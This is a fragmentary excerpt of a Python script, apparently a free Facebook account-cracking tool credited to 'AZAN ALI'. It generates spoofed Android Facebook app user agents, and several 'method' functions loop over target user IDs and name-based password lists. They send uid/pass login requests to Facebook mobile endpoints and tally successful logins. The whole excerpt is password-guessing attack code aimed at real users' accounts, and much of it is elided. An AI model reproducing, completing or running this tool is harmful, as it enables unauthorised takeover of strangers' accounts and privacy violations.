...
for mtc in range(10000):
	rr=random.randint
	xd= f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	sagent.append(xd)
...
BXB="""
       ...
       ##   ##      ##    ##   ##  ####  ## 
      ##     ##    ##    ##     ## ## ## ## 
      #########   ##     ######### ##  #### \033[1;35mA\033[1;37m
     ##     ##  ##      ##     ## ##   ### \033[1;35mI\033[1;37m
     ##     ## ######## ##     ## ##    ##  \033[1;35mL\033[1;37m
[+]==============================================
[+]    CREATED BY :  AZAN ALI 
[+]    FB GROUP     :  HAMRI AUDRI KHANI
[+]    GITHUB          :  PRIVATE
[+]    TOOL STATU :  FREE
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def main():
    print(BXB)
    mr_javed_Iqbal_sad_boyprint(47*"-")
...
def method1(ids,names,passlist,total_ids):
    ...
    sys.stdout.write('\r[M1] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
    ...
    'upgrade-insecure-requests': '1',
            ...
            'uid' : ids,
            'pass' : pas,
            'next' : f'https://p.facebook.com/login/save-device/',
            ...
            'referer': f'https://p.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
...
def method2(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r[M2] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            'accept-language': 'id-ID',
            'cache-control': 'max-age=0',
            'referer': f'https://m.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
...
def method3(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r[M3] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
    ...
    'upgrade-insecure-requests':'1',
            ...
            'referer': f'https://m.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
...
def method4(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r[M4] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
...
def random_method(ids,passlist,total_ids):
    ...
    sys.stdout.write('\r[AXB] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
    try:
        for pas in passlist:
